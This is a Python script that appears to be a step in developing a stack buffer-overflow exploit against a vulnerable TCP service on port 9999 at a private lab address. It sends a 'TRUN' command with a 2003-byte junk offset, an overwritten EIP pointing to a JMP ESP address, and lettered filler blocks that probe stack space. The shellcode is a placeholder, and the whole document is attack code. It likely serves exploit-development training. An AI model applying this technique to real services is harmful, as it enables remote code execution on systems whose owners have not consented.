#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b"C"*256

buff  = b""                 # empty byte var
buff += b"A"*offset         # junk
buff += b"\xAF\x11\x50\x62" # EIP to JMP ESP
buff += b'C'*256            # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256            # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128            # 
buff += b'F'*128            # 
buff += b'G'*64             # 
buff += b'H'*64             # 
buff += b'I'*32             # 
buff += b'J'*32             # 

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()
